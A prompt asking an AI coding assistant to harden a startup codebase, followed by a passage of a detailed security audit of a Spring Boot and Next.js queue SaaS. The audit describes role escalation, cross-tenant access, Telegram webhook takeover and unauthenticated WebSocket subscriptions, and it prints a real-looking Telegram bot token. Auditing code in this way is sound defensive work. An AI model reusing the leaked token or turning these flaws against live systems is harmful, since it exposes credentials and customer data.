Prompt: You are a principal engineer, senior security engineer, senior Spring Boot architect, senior React architect, DevOps engineer, and startup CTO.

You are now entering:
CRITICAL STABILIZATION PHASE.

Your task:
Fix the REAL architectural mistakes, security vulnerabilities, broken logic, concurrency flaws, and startup-critical issues identified in the audit report.

IMPORTANT:
You MUST use the attached FULL_PROJECT_AUDIT.md file as the primary source of truth.

DO NOT:
- ignore the audit
- rewrite the whole project unnecessarily
- overengineer solutions
- introduce fake enterprise complexity
- create unnecessary abstractions
- blindly regenerate files
- break existing working functionality

You must:
- preserve the existing architecture where reasonable
- fix only what is actually broken
- improve maintainability
- improve security
- improve correctness
- improve startup readiness
- improve operational stability

==================================================
PRIMARY GOAL
==================================================

Transform this codebase from:
“demo-grade prototype with critical flaws”

into:
“secure, stable, startup-ready MVP”

WITHOUT turning it into:
- enterprise overengineering
- microservice chaos
- unnecessary complexity

==================================================
VERY IMPORTANT DEVELOPMENT PHILOSOPHY
==================================================

Prioritize:
1. Security
2. Correctness
3. Tenant isolation
4. Queue consistency
5. Stability
6. Maintainability
7. Scalability later

NOT:
- fake AI
- unnecessary abstractions
- premature optimization
- enterprise buzzword architecture

==================================================
CRITICAL REQUIREMENT
==================================================

For EVERY issue:
1. explain WHY it is dangerous
2. explain the REAL root cause
3. explain the best practical fix
4. implement the fix carefully
5. explain risks of the implementation
6. explain migration impact

==================================================
WORKFLOW REQUIREMENT
==================================================

DO NOT mass-edit blindly.

You must:
- analyze first
- verify audit findings against real code
- confirm issue validity
- implement safe fixes incrementally
- avoid breaking changes unless necessary

==================================================
FIRST TASK
==================================================

Read and deeply analyze:
FULL_PROJECT_AUDIT.md

Then generate:
CRITICAL_FIX_PLAN.md

The fix plan must include:

# 1. Critical Security Fixes
# 2. Multi-tenant Isolation Fixes
# 3. RBAC Enforcement Plan
# 4. Queue Engine Consistency Fixes
# 5. WebSocket Security Fixes
# 6. Telegram Security Fixes
# 7. Infrastructure Cleanup
# 8. Frontend Security Fixes
# 9. Technical Debt To Ignore For MVP
# 10. Recommended Refactor Order

For EVERY issue include:
- severity
- impact
- affected files
- exact root cause
- implementation strategy
- migration risk
- startup priority

==================================================
AFTER GENERATING THE PLAN
==================================================

Then begin implementing fixes IN PRIORITY ORDER.

==================================================
PHASE 1 — FIX IMMEDIATELY
==================================================

You MUST prioritize these FIRST:

## AUTHORIZATION & SECURITY
- add proper RBAC
- add @PreAuthorize everywhere needed
- implement role hierarchy
- secure admin endpoints
- secure platform endpoints
- secure ticket ownership
- secure queue operations
- secure device APIs

## MULTI-TENANCY
- fix resolveOrgId()
- eliminate cross-tenant access
- enforce tenant ownership checks
- enforce tenant-scoped queries
- verify branch/window ownership everywhere

## SECRET & TOKEN SECURITY
- remove leaked secrets
- remove hardcoded defaults
- enforce env validation
- rotate insecure defaults
- secure JWT config
- secure webhook secret handling

## TELEGRAM SECURITY
- validate auth_date freshness
- secure webhook registration
- prevent replay attacks
- unify duplicated Telegram logic
- remove insecure fallback behavior

## WEBSOCKET SECURITY
- authenticate websocket connections
- restrict subscriptions by tenant
- validate STOMP CONNECT auth
- remove wildcard origins

==================================================
PHASE 2 — QUEUE CORRECTNESS
==================================================

Then fix:
- TOCTOU races
- queue synchronization issues
- no-show race conditions
- transactional event handling
- event ordering
- websocket-before-commit problems
- scheduler duplication risks
- in-memory distributed-state issues

==================================================
PHASE 3 — MVP STABILIZATION
==================================================

Then:
- remove dead modules
- remove unused infrastructure
- remove fake AI claims
- simplify architecture
- improve maintainability
- remove duplicated code
- improve frontend structure minimally

==================================================
VERY IMPORTANT RULES
==================================================

DO NOT:
- convert to microservices
- rewrite entire frontend
- introduce Kubernetes
- introduce event sourcing
- add unnecessary patterns
- add complex DDD abstractions
- add CQRS unless absolutely necessary

Keep the architecture:
- simple
- startup-friendly
- understandable
- maintainable

==================================================
IMPLEMENTATION REQUIREMENTS
==================================================

For every fix:
- show affected files
- explain changes
- explain security impact
- explain architectural impact
- explain migration risks
- ensure compatibility with existing flows

==================================================
TESTING REQUIREMENTS
==================================================

For every critical fix:
- add tests where necessary
- add integration tests for auth
- add queue concurrency tests
- add tenant-isolation tests
- add websocket auth tests
- add replay-attack tests

==================================================
CODE QUALITY REQUIREMENTS
==================================================

Code must be:
- production-grade
- readable
- maintainable
- realistic
- startup-appropriate

NOT:
- AI-generated spaghetti
- fake enterprise architecture
- abstraction-heavy nonsense

==================================================
CRITICAL THINKING REQUIREMENT
==================================================

Do NOT trust the audit blindly.

You must:
- verify every issue against real code
- distinguish:
  - confirmed issues
  - probable issues
  - speculative concerns

Only implement fixes for:
- confirmed
- realistically dangerous issues

==================================================
OUTPUT STYLE
==================================================

Be:
- deeply technical
- brutally honest
- architecture-focused
- practical
- startup-aware

Act like:
- a principal engineer repairing a startup before launch
- a CTO preparing for first pilot customers
- a security engineer hardening a vulnerable SaaS

==================================================
FINAL GOAL
==================================================

The final system should become:

- secure enough for real pilot customers
- stable enough for production MVP
- maintainable by a small startup team
- scalable enough for early growth
- realistic for current startup stage

NOT:
- overengineered enterprise software
- fake AI platform
- architecture astronaut project

# zeyvo — Full Project Audit


**Auditor**: Principal engineer / production SaaS architect / security auditor
**Date**: 2026-05-18
**Repo root**: `D:\Claude\zeyvo`
**Codebase size**: 6,670 Java LOC (backend) + 9,337 TSX LOC (frontend) + ~250 LOC SQL
**Stack snapshot**: Spring Boot 3.4.1 (Java 21, virtual threads), Next.js 15.1 / React 19, PostgreSQL 16 + TimescaleDB, Redis 7, RabbitMQ 3.13, Docker Compose, nginx, Telegram bot

---

## TL;DR

> This is a **demo-grade prototype dressed in enterprise clothing**. The landing page advertises SOC 2 Type II, ISO 27001, 142 enterprise customers, ML wait-time predictions, and multi-region data residency. The actual code has **zero RBAC enforcement**, **broken multi-tenancy**, **no real AI**, a Telegram bot token leaked in `application.yml`, unused RabbitMQ + Redis dependencies, and a single in-memory rate limiter that won't survive a second JVM instance. The queue engine itself (the actual product) is competent but riddled with cross-tenant authorization holes and concurrency edges. If this codebase is shown to investors as a "production SaaS," it will not survive 10 minutes of technical due diligence.
>
> **Verdict — production-ready? No.**
> **Verdict — startup-ready (MVP for one branch)? Yes, after 2–3 weeks of security and auth hardening.**

---

# 1. Executive Summary

## 1.1 Scorecard

| Dimension                 | Score / 10 | One-line verdict                                                                                                 |
| ------------------------- | ---------- | ---------------------------------------------------------------------------------------------------------------- |
| **Overall architecture**  | **5.0**    | Sane modular monolith shape, but half the modules are empty or pointing at unused infrastructure.                |
| **Production readiness**  | **2.0**    | One mis-typed URL away from full org-data leak. Cannot deploy as-is.                                              |
| **Startup / MVP readiness** | **6.0**    | If you scope it to a single tenant, single branch, the happy path works.                                          |
| **Code quality**          | **5.5**    | Backend Java is competent; frontend is a 9k-LOC swamp of inline styles.                                          |
| **Scalability**           | **3.0**    | Stateful schedulers, in-memory rate limit, no Redis usage — won't horizontally scale past 1 JVM.                 |
| **Maintainability**       | **4.0**    | Inline styles everywhere; duplicated Telegram services; identical SQL re-implemented in multiple places.        |
| **Security**              | **1.5**    | Catastrophic. Zero method-level authorization. Tenant ID from JWT ignored. Bot token in repo. See section 8.   |
| **Test coverage**         | **0.5**    | 3 unit tests, 165 lines, all happy-path. No integration tests, no concurrency tests, no security tests.          |
| **Observability**         | **3.0**    | Prometheus is wired but no custom metrics; no tracing; logs are unstructured outside prod.                       |
| **Documentation**         | **5.0**    | DEPLOY.md is decent. No ADRs, no architecture overview, no API docs beyond springdoc default.                    |

## 1.2 The Five Biggest Risks (in order)

1. **CRITICAL — Multi-tenant authorization is non-functional.**
   `BranchController.resolveOrgId()` checks `auth.getDetails() instanceof java.util.Map`. The filter actually puts an `io.jsonwebtoken.Claims` object there, so the `instanceof` is always false. It falls back to `tenantService.getFirstOrgId()`. **Every authenticated user, regardless of org_id claim, operates on whatever organization happens to be the oldest in the table.** A user from Tenant B logging in will read, modify, and create branches under Tenant A. (`backend/module-tenant/src/main/java/com/zeyvo/tenant/api/BranchController.java:148-155`)

2. **CRITICAL — Zero method-level RBAC.** `@EnableMethodSecurity` is set in `SecurityConfig`, but `grep -r "@PreAuthorize\|hasRole\|hasAuthority" backend` returns **zero hits**. `AdminUserController` lets any authenticated `customer` grant themselves the `org_admin` role via `POST /v1/admin/users/{userId}/roles`. Then they own every tenant.

3. **CRITICAL — Secrets leaked to the repo.**
   `application.yml:104` ships a default value for `TELEGRAM_BOT_TOKEN` that looks like a real bot token (`8896231926:AAEUfZn-e1_UFBunoWAbgouKhVrz2jtYGzM`). If this repo is on GitHub, that token is compromised the moment it's pushed. JWT secret default is `dev-secret-change-in-production-32chars` — works in prod if `JWT_SECRET` env var is missing, because the validator only checks length (32+).

4. **HIGH — The AI is fake.**
   The landing page sells "AI wait-time predictions, live in Tashkent" with "Median absolute error under 90 seconds." The actual estimator is one line in `HeuristicEtaEstimator.java:14`: `ticketsAhead * avgServiceMinutes / openWindows`. There is no model, no training pipeline, no inference service. `spring-ai-bom` is imported but never used. The "Predict" admin page literally says "Phase 2" while showing the same heuristic.

5. **HIGH — No horizontal scalability.**
   `TelegramBotService.linkCodes`/`webLoginCodes` (in-memory `ConcurrentHashMap`), `TicketLifecycleScheduler.nudgedTickets` (in-memory `Set`), `RateLimitFilter.buckets` (in-memory `ConcurrentHashMap`), and `TelegramBotService.lastUpdateId` (in-memory `AtomicLong`) all break the moment you run a second JVM. Both `@Scheduled` tasks (no-show check, expiry check, near-turn nudge, Telegram poll) will also double-fire across instances.

## 1.3 The Three Biggest Strengths

1. **Atomic ticket-number generation.** `INSERT … ON CONFLICT DO UPDATE … RETURNING next_val` against `app.ticket_counter` is exactly right — race-safe, no advisory locks needed. (`TicketService.generateTicketNumber`)
2. **`SELECT FOR UPDATE SKIP LOCKED` for `callNext`.** Two operators clicking "Call next" at the same instant correctly grab different tickets. (`TicketService.callNext:107-117`)
3. **The database schema is honest.** Reasonable indexes (partial indexes for hot paths), correct check constraints, `idempotency_key UNIQUE`, deferred FK from `window_desk.serving_ticket` → `ticket.id` to break the circular dependency. The DBA who wrote `V1__baseline_schema.sql` knew what they were doing.

---

# 2. Full Project Structure Analysis

## 2.1 Repository tree

```
zeyvo/
├── apps/web/                       Next.js 15.1 frontend
│   ├── app/                        App-router pages (route groups: app/admin/auth/kiosk/signage/super/telegram)
│   ├── lib/                        api.ts, realtime.ts, types.ts
│   ├── stores/                     Zustand (auth, ui)
│   ├── i18n/                       next-intl config (unused — see §11)
│   └── messages/                   en/ru/uz JSON (unused — see §11)
├── backend/
│   ├── app/                        Spring Boot main, security, audit listener, PlatformController
│   │   └── src/main/resources/
│   │       ├── application*.yml
│   │       └── db/migration/       Flyway V1, V2, V3
│   ├── common-domain/              ⚠ EMPTY (no .java files under src/main)
│   ├── common-web/                 ApiError, DomainException, GlobalExceptionHandler, HealthController, RateLimitFilter, TenantContext
│   ├── module-auth/                AuthService, JwtService, TelegramAuthService, TelegramBotService, EskizSmsService, SecurityConfig, JwtAuthFilter, AdminUserController, MeController, AuthController, DevAuthController
│   ├── module-queue/               TicketService, NoShowScheduler, NoShowAutoAdvanceListener, TicketLifecycleScheduler, HeuristicEtaEstimator, TicketController, WindowController, 6 event records
│   ├── module-tenant/              TenantService, BranchController, 5 domain entities, 5 repositories, 10 DTOs
│   ├── module-notification/        TelegramNotificationService, NotificationListener, TelegramWebhookController
│   ├── module-analytics/           AnalyticsController only — 1 file
│   ├── module-realtime/            WebSocketConfig, BroadcastService, QueueEventBroadcaster
│   └── module-adapter/             4 adapter impls (GenericHttp, Innomax, WebKiosk, WebSignage), DeviceController, DeviceService, AdapterRegistry, SyncOrchestrator
├── packages/
│   ├── config/                     ⚠ Only package.json — empty
│   └── ui/                         4 trivial primitives (Btn, LiveDot, Skeleton, Tag) — not imported by web app
├── infra/
│   ├── docker/                     Dockerfile.backend, Dockerfile.web, docker-compose.yml, docker-compose.prod.yml, seed.sql, rabbitmq.conf, postgres-init/01_extensions.sql
│   ├── nginx/zeyvo.conf            Two server blocks (zeyvo.app + api.zeyvo.app), rate-limit zones
│   ├── runbooks/DEPLOY.md          Decent operational runbook
│   └── scripts/                    deploy.sh (ssh+docker pull), backup.sh (pg_dumpall to DO Spaces)
├── Makefile                        Wraps docker compose via WSL2, Gradle, pnpm
├── turbo.json                      Turborepo with `web` only
└── pnpm-workspace.yaml             Workspace: apps/* + packages/*
```

## 2.2 Module dependency map (intended)

```
┌─────────────────────────────────────────────────────────┐
│                          :app                            │
│  ZeyvoApplication, AuditEventListener, PlatformController│
└──────┬──────┬──────┬──────┬──────┬──────┬──────┬───────┘
       │      │      │      │      │      │      │
       ▼      ▼      ▼      ▼      ▼      ▼      ▼
   :common-web   :module-auth    :module-queue
       ▲             │                │
       │             ▼                ▼
   :common-domain  :module-tenant  :module-realtime
   (EMPTY)             │                │
                       ▼                ▼
                 :module-notification :module-analytics
                       │
                       ▼
                 :module-adapter
```

**Real dependency map (what actually exists):**
- `:common-domain` is **empty** (no `.java` under `src/main`). Compiles to a zero-class JAR. Dead module.
- `:module-realtime` depends on `:module-queue` (for event records) — circular in spirit, fine in practice.
- `:module-notification` reaches into `:module-queue.service.TicketLifecycleScheduler.NearTurnEvent` — a nested record inside a scheduler class. Bad coupling boundary.
- `:module-adapter` depends on `:module-queue.events.*` AND `:module-queue.service.TicketService` AND `:module-tenant.*`. The adapter layer should be a downstream sink, not pulling in services.

## 2.3 Architectural intent vs reality

The README/docs sell this as a "modular monolith." That's defensible. But the modules are not cleanly separated:

| Module                | Files | Real purpose                                                              | Architectural integrity |
| --------------------- | ----- | ------------------------------------------------------------------------- | ----------------------- |
| `common-domain`       | **0** | "Shared domain types"                                                    | DEAD — delete it        |
| `common-web`          | 7     | API error model, exception handler, rate-limit filter, tenant ThreadLocal | OK                      |
| `module-auth`         | 22    | JWT, Telegram OAuth, OTP, sessions, dev login, admin user mgmt           | Mixes concerns — admin user CRUD belongs in `module-tenant` |
| `module-queue`        | 22    | Tickets, schedulers, ETA, lifecycle                                       | Best-organized module   |
| `module-tenant`       | 24    | Branches, services, windows, operating hours                              | OK; tightly coupled to JPA |
| `module-notification` | 3     | Telegram outbound notifications + webhook                                 | Duplicates parts of `module-auth.TelegramBotService` |
| `module-analytics`    | 1     | One controller, 4 endpoints                                              | Module exists for one file — fold into `:app` |
| `module-realtime`     | 3     | STOMP broadcast, event listener                                          | OK                      |
| `module-adapter`      | 13    | Hardware device integration (kiosk, signage)                              | Adapters share zero common interface logic |

**Verdict:** module boundaries were drawn ahead of code. The split is correct in shape but pre-empts a codebase that doesn't yet exist. Move `module-analytics` back into `:app`, delete `common-domain`, merge the two Telegram services into one.

---

# 3. Backend Audit

## 3.1 Per-module deep dive

### 3.1.1 `:app` — bootstrap

**`ZeyvoApplication.java`** (16 LOC) — standard `@SpringBootApplication` with `@EnableScheduling` + `@EnableAsync`. Fine.

**`AuditEventListener.java`** (100 LOC) — listens to ticket/user events and writes to `app.audit_event`.

**Bugs:**
1. **JSON injection (low severity).** `write()` builds the `data` JSON by string concatenation: `"{\"detail\":\"" + detail + "\"}"`. If `detail` ever contains a `"` or `\`, the row inserts as malformed JSON or worse. Today `detail` is always a ticket number (`A-101`) so this is dormant, but it's a footgun. Use `objectMapper.writeValueAsString` or `jsonb_build_object`.
2. **Async write loses tenant context.** `@Async` runs on a different thread; `TenantContext.get()` will throw. Not used here, but a sign the threading model isn't thought through.
3. **No transactional event listener.** Uses `@EventListener` with `REQUIRES_NEW`. If the source transaction rolls back, the audit log records an event that never actually happened. Should be `@TransactionalEventListener(phase = AFTER_COMMIT)`.

**`PlatformController.java`** (98 LOC) — super-admin stats.
- Three endpoints: `/v1/platform/stats`, `/v1/platform/tenants`, `/v1/platform/audit`.
- **No `@PreAuthorize`.** Any authenticated user can fetch all tenant data and the audit log.
- N+1: `tenants()` calls `branchRepo.countByOrganizationId(o.getId())` inside a `stream().map()` — one COUNT query per org. Fine for 10 tenants, dies at 10,000.

### 3.1.2 `:common-web`

**`TenantContext.java`** — single most dangerous file in the codebase.
- Uses `InheritableThreadLocal<UUID>`. Combined with `spring.threads.virtual.enabled: true`, this is a multi-tenant ticking time bomb. Virtual threads inherit ThreadLocals from the carrier thread or from `Thread.currentThread().getInheritedThreadLocalValues()` on creation. In high-throughput situations with pinned carrier threads, you can leak Tenant A's UUID into a request handler processing Tenant B's call.
- **However** — TenantContext is **never read** anywhere in the codebase except in `JwtAuthFilter.setTenantContext` (which writes) and `clear` (which clears). Grep confirms: zero `TenantContext.get()` calls. So multi-tenancy is theoretically broken AND practically nonexistent. The class is dead.

**`RateLimitFilter.java`** (103 LOC) — bucket4j-based rate limiter.
- `ConcurrentHashMap<String, Bucket>` keyed by `category:ip`. Map grows unbounded (no eviction). Memory leak.
- Only enabled when `zeyvo.rate-limit.enabled=true`. Default in `application.yml`: undefined. `application-prod.yml` sets it to `true`. `application-dev.yml`/`application-local.yml` omit it — so default is "off", per Spring Boot convention.
- **IP spoofing.** `resolveIp()` trusts `X-Forwarded-For` blindly. Anyone hitting the backend directly (or via a misconfigured proxy) can rotate IPs in the header and bypass the limit. nginx is upstream in prod, but the backend trusts the header even if no proxy exists. Use `server.forward-headers-strategy: framework` + `RemoteIpFilter` chain trust.
- **Single-instance only.** Bucket4j's `bucket4j-redis` dependency is **declared in `libs.versions.toml` but never used** (`grep bucket4j.redis` returns only the version catalog entry).
- Hardcoded JSON response body — should use the `ApiError` problem+json shape.

**`GlobalExceptionHandler.java`** — RFC 9457 problem+json. Solid.

**`ApiError.java`** — `toTitle()` blows up on empty `code`. Won't happen in practice; minor.

### 3.1.3 `:module-auth`

**`JwtService.java`** (85 LOC) — HS256 with jjwt 0.12.6.
- Length check on secret (≥ 32 chars). Good.
- Algorithm is HMAC-SHA256. Doesn't support key rotation; doesn't include `kid`. Fine for MVP, not enterprise.
- `parseSafe` swallows all `JwtException`s — including expired tokens, which should be surfaced to the auto-refresh flow on the client. Today the client only knows about 401 from downstream endpoints, not the JWT parse outcome itself. Acceptable.
- No JWT replay protection (no jti, no blacklist). Logout revokes refresh tokens but the access token is valid until expiry.

**`SecurityConfig.java`** (86 LOC) — the security door.
```java
.requestMatchers(HttpMethod.GET, "/v1/tickets/**").permitAll()
.requestMatchers(HttpMethod.POST, "/v1/tickets").permitAll()
.requestMatchers(new AntPathRequestMatcher("/v1/tickets/*/cancel", "POST")).permitAll()
.requestMatchers(new AntPathRequestMatcher("/v1/tickets/*/rate", "POST")).permitAll()
```
- **Anyone can GET any ticket by UUID** — privacy issue, but UUIDs are unguessable. Still, leaks `customer_id`, `branch_id`, `service_id`, `joined_at`. Should require auth+ownership.
- **Anyone can cancel any ticket** — they just need the UUID. If a UUID leaks via SMS reply or kiosk receipt, anyone can grief-cancel.
- **Anyone can rate any ticket**, including overwriting later. (Actually the service rejects double-rating, but the endpoint takes 5-star ratings from anonymous requesters.)
- CORS `allowedOrigins` is hardcoded to `localhost:3000`, `zeyvo.app`, `www.zeyvo.app`. Not configurable per environment. `setAllowCredentials(true)` + wildcard `allowedHeaders` is OK because origins are explicit.
- **DevAuthController is profile-guarded (`@Profile("local")`)** — good. But because the security config matches `/v1/auth/**` as `permitAll`, the controller is reachable without auth when active. That's the intent for dev login. OK.

**`JwtAuthFilter.java`** (70 LOC) — bearer parsing.
- Calls `chain.doFilter(req, res)` **inside** the `try` block, then clears `TenantContext` in `finally`. Correct ordering.
- `auth.setDetails(claims)` puts a `Claims` instance in the auth details. **This is what `BranchController.resolveOrgId()` checks `instanceof Map` against — and a Claims is not a Map**, so the check always fails. This is the multi-tenancy break (see §1.2 #1).
- No anonymous filter for `permitAll` endpoints — fine, Spring's anonymous handling covers it.

**`AdminUserController.java`** (171 LOC) — user/role management.
- **No `@PreAuthorize`.** This is the role-escalation endpoint anyone can call. Critical.
- `setRoles()` deletes all roles then inserts new ones. Not atomic across organizations (deletes globally, inserts into "first org"). Multi-tenant break.
- `firstOrgId()` runs `SELECT id FROM app.organization ORDER BY created_at LIMIT 1` per call — every role write hits this. Bad.
- Native SQL, not parameterized at the role list level (but the role string is checked against a whitelist, so SQL injection is blocked).

**`AuthService.java`** (285 LOC) — the auth core.
- OTP flow is OK (BCrypt-hashed codes, max 5 attempts, 5 per hour per phone, expires in 5 min). Solid.
- Refresh token rotation: revokes old, issues new. Correct.
- `hashToken(raw)` is SHA-256 (deterministic for DB lookup). OK, refresh tokens are 64-hex random.
- `authenticateViaWidget`: passes raw map into `validateWidgetData` — auth_date age check is there. Good.
- `authenticateViaTelegram` (WebApp initData): **does NOT validate `auth_date` age**. Telegram's initData includes auth_date; this code never reads it. A captured initData can be replayed forever.
- `events.publishEvent(new UserRegisteredEvent(...))` only fires once per registration — correct (only when `isNew`).

**`TelegramAuthService.java`** (160 LOC) — HMAC validation.
- Constant-time comparison via XOR accumulator — correct.
- `validateAndExtractUser` does not check auth_date freshness (see above).
- URL-decode-then-build data-check-string approach matches Telegram's spec (initData values are URL-encoded in the HTTP body, decoded before hashing). OK.

**`TelegramBotService.java`** (400 LOC) — bot polling + login codes + contact handling.
- **Polling AND webhook both active.** `pollUpdates` runs every 4 s (`@Scheduled(fixedDelay = 4_000)`). `TelegramWebhookController` accepts webhooks. Telegram rejects mixing the two — calling `setWebhook` disables `getUpdates`. But the poll loop runs anyway and silently fails. Wasted compute and a possible double-handle path if someone clears the webhook.
- `linkCodes` and `webLoginCodes` are in-memory `ConcurrentHashMap`. Two-instance deploy breaks login.
- `lastUpdateId` is in-memory `AtomicLong`. On restart, offset resets to 0 and the bot replays all undelivered updates (including old `/start XXXX` link codes that already expired).
- **Markdown injection.** Bot sends user-controlled `chatId` content (the ticket numbers etc are safe) with `parse_mode: Markdown`. If user-supplied text ever lands in the message body (e.g., contact name), `*bold*` injection is possible — not critical for an outbound bot, but noted.
- `handleCancelCmd` calls `UPDATE app.ticket SET status='cancelled'` directly, bypassing the domain event flow. **No `TicketCancelled` event fires from a `/cancel` bot command.** Audit log, websocket broadcast, and adapter sync all miss it.

**`TelegramWebhookController.java`** (215 LOC) — webhook receiver + bot command handler #2.
- Same `/status`, `/cancel`, `/start` handling as `TelegramBotService.pollUpdates`. **The two are duplicated implementations.** Touched by two unrelated modules. Fix one, miss the other.
- Webhook secret check: `if (!webhookSecret.isBlank() && !webhookSecret.equals(secret))`. **If `webhookSecret` is empty (default), webhook is unauthenticated.** Anyone who knows the URL can POST fake bot updates. The path `/v1/integrations/telegram/webhook` is `permitAll` in `SecurityConfig`. Anonymous remote command execution against the queue if you can guess a telegram_id of an existing user.
- `registerWebhook` endpoint is also `permitAll`. Anyone can re-register the bot's webhook URL to their own server. **Bot takeover.**
- `linkTelegramAccount()` runs `UPDATE app.user_account SET telegram_id = :tid WHERE telegram_id = :tid` — a no-op pretending to be an upsert. Dead code.
- `ticketService.cancel(ticketId, null)` — passing `null` bypasses owner check (admin path). Means the bot can cancel anyone's ticket if you can spoof a webhook (which you can, see above).

### 3.1.4 `:module-queue` — the actual product

**`TicketService.java`** (360 LOC) — the heart.

**The good:**
- `generateTicketNumber`: atomic `INSERT ... ON CONFLICT DO UPDATE ... RETURNING next_val`. Correct.
- `callNext`: `SELECT ... FOR UPDATE SKIP LOCKED LIMIT 1`. Correct concurrency primitive. Two operators racing on the same branch will get different tickets or one gets nothing.

**The bad:**
1. **Capacity check has a TOCTOU race.** Lines 64-68:
   ```java
   int activeCount = ticketRepository.countActiveByBranch(req.branchId());
   if (activeCount >= branchCapacity) throw ...;
   ```
   Then `ticketRepository.save(ticket)`. Two concurrent calls can both observe `activeCount = capacity-1` and both insert. Branch capacity is not an FK-enforced invariant.
2. **No tenant verification.** `callNext(windowId, branchId, ...)` doesn't check that the window or branch belongs to the caller's organization. An operator at Tenant A can `callNext` on Tenant B's window. Cross-tenant exploitation.
3. **`closeCurrentlyServingOnWindow` is destructive.** When `callNext` is invoked, if the window already has a CALLED ticket, this method auto-marks it `no_show`. If the operator clicked "Call next" by accident, the previous customer just got a no-show on their record. There should be a confirmation or a "transfer" path.
4. **`transfer` semantics are odd.** Sets status back to WAITING but keeps `windowId` set. The waiting-list query (`status='waiting' ORDER BY joined_at`) will still surface this ticket. The `+5` priority bump prevents starvation but creates a subtle priority inversion against newer high-priority tickets. Untested.
5. **`confirmPresence` doesn't change state.** It only resets `called_at` so the no-show scheduler picks a fresh cutoff. But the ticket stays in CALLED. If the operator never serves them, they'll get a no-show 3 minutes after the next `confirmPresence`. The UX implies "I'm here, I'm safe," but the operator must still take action.
6. **Anonymous-customer-can-stack-tickets-across-branches.** `countActiveByCustomerAndBranch` only fires when `customerId != null`. Anonymous tickets (no auth) can take 100 tickets at the same branch (until capacity hits) — only stopped by IP-based rate limiting (disabled in dev).
7. **`checkBranchIsOpen` does 2 separate queries** for the existence + match. Combine into one.
8. **Operating-hours window across midnight is broken.** `WHERE open_at <= :t AND close_at > :t` doesn't handle 22:00 → 02:00 wrap-around.

**`NoShowScheduler.java`** (62 LOC) — every minute, mark CALLED tickets older than `no-show-timeout-minutes` as NO_SHOW.
- Single-instance scheduler. Two JVMs = double no-show events.
- Loop mutates entities one-by-one and publishes events one-by-one (no batching). On a queue with 200 expired tickets, that's 200 separate event listeners running 200 audit writes etc.
- `entityManager.createNativeQuery("UPDATE app.window_desk SET serving_ticket = NULL WHERE serving_ticket = :ticketId")` — could be combined into the same loop as the dirty-checking update.

**`TicketLifecycleScheduler.java`** (142 LOC) — near-turn nudge + expiration.
- `nudgedTickets` — in-memory `Set<UUID>`. Restart = duplicate nudges. Multi-instance = duplicate nudges. Move to Redis.
- The near-turn query is **N+2** in the worst case: outer SELECT, inner correlated subquery TWICE (once in SELECT, once in WHERE). PostgreSQL may collapse to a window function but as written it scans `ticket` once per row. Use `COUNT(*) OVER (PARTITION BY branch_id ORDER BY joined_at)` window function.
- Expiry uses JPQL UPDATE batched at 100. Doesn't reset `closed_at` — inconsistent state (waiting→expired with `closed_at = NULL`).

**`NoShowAutoAdvanceListener.java`** — fires next ticket after a no-show. Reasonable. Async, transactional. The `lookupWindowNumber` returns 0 on miss — that 0 ends up in the broadcast payload.

**`TicketRepository.java`** — clean enough. JPQL with explicit `com.zeyvo.queue.domain.TicketStatus.WAITING` etc. Verbose but type-safe.

**`TicketController.java`** (196 LOC).
- **Duplicate import:** lines 7 and 8 both import `com.zeyvo.queue.domain.Ticket`. Compiler warning at minimum.
- `GET /v1/tickets/{id}` runs **3-5 separate queries** per call (position, open windows, avg duration, window detail, service+branch name). Should be one join. Worth 80% latency reduction.
- `transfer` endpoint accepts arbitrary `toWindowId` with no validation that the window belongs to the same branch or any branch.
- `rate` endpoint is `permitAll` — see security audit.
- `queue` (GET /v1/tickets) is `permitAll` and takes any `branchId`. Anonymous cross-tenant queue inspection.
- `my` (GET /v1/tickets/my) batch-fetches names in one query — finally an N+1 fix. Good pattern; apply to others.

**`WindowController.java`** (108 LOC).
- `callNext`, `serve`, `noShow`, `setStatus` — **no authorization**, no ownership check.
- `windowNumber` is passed as a query parameter from the client and trusted. Client could lie about which window number it is.
- `setStatus` accepts `{"status": "..."}` body, validated against `Set.of("open","closed","paused","idle")`. OK.

### 3.1.5 `:module-tenant`

**`BranchController.java`** (157 LOC).
- `resolveOrgId(auth)` is **the bug from §1.2 #1**. `auth.getDetails()` returns `Claims`, the check is `instanceof java.util.Map`, always false → `tenantService.getFirstOrgId()`. **Every org-write operation goes into Tenant A.**
- `POST /v1/dev/seed` is exposed in production. Even though `permitAll` lets unauthenticated callers hit it, it'll create the Asaka Bank demo in any environment where the route exists.
- `PUT /v1/branches/{id}/operating-hours` takes a `List<OperatingHoursDto>` body with no `@Valid` and no validation that `openAt < closeAt`.
- Every `@PostMapping`/`@PatchMapping`/`@DeleteMapping` is missing `@PreAuthorize("hasAnyRole('ORG_ADMIN','MANAGER')")`.

**`TenantService.java`** (350 LOC) — branch/service/window CRUD + seed.
- `setOperatingHours`: `delete all` then `insert all`. If insert fails mid-batch, hours are wiped.
- `seedDemoData` returns the demo branch — fine — but is exposed via `/v1/dev/seed` to the world.
- `createBranch`: slug derivation strips non-ASCII, so non-Latin branch names (Кириллица) generate empty slugs or `-1234`. Won't break, but ugly.

### 3.1.6 `:module-notification`

**`NotificationListener.java`** (130 LOC).
- 3 separate queries per event: `telegram_id`, `avg_duration_s`, `open_windows`. Move to one join.
- `@EventListener` not `@TransactionalEventListener` — same rollback-but-still-notify issue.
- `@Async @Transactional(readOnly = true)` on an event handler that's already running outside the source transaction — the `readOnly=true` is meaningless because the event listener never writes.

**`TelegramNotificationService.java`** (118 LOC) — sender service.
- Duplicate of `TelegramBotService` setup (`RestClient`, baseUrl). Two `RestClient` instances created for the same Telegram API. Wasteful but harmless.
- `parse_mode: Markdown` everywhere. Customer name in the welcome message → can break formatting.

**`TelegramWebhookController.java`** — already covered in §3.1.3.

### 3.1.7 `:module-analytics`

**`AnalyticsController.java`** (208 LOC) — 4 endpoints.
- **Does not use `analytics.ticket_event` hypertable** that was created in V1 for TimescaleDB. Every query hits `app.ticket` directly. The hypertable is created but never written to. Dead schema.
- **No tenant check.** Any user can fetch metrics for any branch.
- 24-hour and 7-day windows hit the OLTP path with `EXTRACT(EPOCH FROM ...)` aggregations. Adequate for a small dataset, will be a problem at scale.

### 3.1.8 `:module-realtime`

**`WebSocketConfig.java`** (26 LOC).
- `setAllowedOriginPatterns("*")` — any origin can connect. CORS isn't enforced for WebSocket the same way as HTTP, but you should still restrict.
- No `ChannelInterceptor` for STOMP CONNECT auth. Anonymous clients can subscribe to `/topic/branches/{any-branch}/ops` and watch other tenants' operator events in real time. **Privacy disaster.**
- No per-tenant routing. Topics encode the branchId directly; subscribing to a guessed branchId leaks all activity.

**`QueueEventBroadcaster.java`** (153 LOC).
